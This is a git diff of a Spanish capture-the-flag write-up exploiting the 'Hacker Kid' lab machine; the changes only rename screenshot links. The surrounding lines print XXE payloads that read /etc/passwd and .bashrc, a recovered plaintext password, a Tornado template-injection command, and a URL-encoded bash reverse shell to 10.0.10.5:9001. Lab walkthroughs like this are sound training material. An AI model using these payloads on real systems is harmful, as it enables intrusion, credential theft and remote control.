@@ -123,13 +123,13 @@ Target: http://10.0.10.7/
 
 - El formulario de registro envía información a través de XML y es candidato para probar XXE.
 
-<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki10.jpg" width=80% />
+<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki010.jpg" width=80% />
 
 ```
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root><name>omar</name><tel>987654321</tel><email>&xxe;</email><password>password</password></root>
 ```
 
-<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki11.jpg" width=80% />
+<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki011.jpg" width=80% />
 
 - En el listado aparece el usuario SAKET. Toca buscar archivos "importantes" que puedan ser leidos a través de XXE.
 * .bash_history
@@ -144,22 +144,22 @@ Target: http://10.0.10.7/
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc"> ]><root><name>omar</name><tel>987654321</tel><email>&xxe;</email><password>password</password></root>
 ```
 
-<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki12.jpg" width=80% />
+<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki012.jpg" width=80% />
 
 - Decodeamos el archivo y encontramos credenciales:
 
-<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki13.jpg" width=80% />
+<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki013.jpg" width=80% />
 
 ### 4.2 SSTI (Server Side Template Injection)
 
 - Durante el escaneo se identificó el puerto TCP/9999
 - Se prueba el usuario saket:Saket!#$%@!!
 
-<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki14.jpg" width=80% />
+<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki014.jpg" width=80% />
 
 - El sistema te indica que "le digas tu nombre". Vamos a probar enviando el parámetro NAME a través del método GET.
 
-<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki15.jpg" width=80% />
+<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki015.jpg" width=80% />
 
 - En google se puede obtener este recurso: https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/, asociado al header TORNADOSERVER 6.1
 
@@ -169,7 +169,7 @@ Target: http://10.0.10.7/
 {% import os %}{{ os.popen("whoami").read() }}
 ```
 
-<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki16.jpg" width=80% />
+<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki016.jpg" width=80% />
 
 - Establecemos una conexión reversa:
 ```
@@ -182,7 +182,7 @@ Target: http://10.0.10.7/
 %7b%25%20%69%6d%70%6f%72%74%20%6f%73%20%25%7d%7b%7b%6f%73%2e%73%79%73%74%65%6d%28%27%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%30%2e%31%30%2e%35%2f%39%30%30%31%20%30%3e%26%31%22%27%29%7d%7d%0a
 ```
 
-<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki17.jpg" width=80% />
+<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki017.jpg" width=80% />
 
 
 
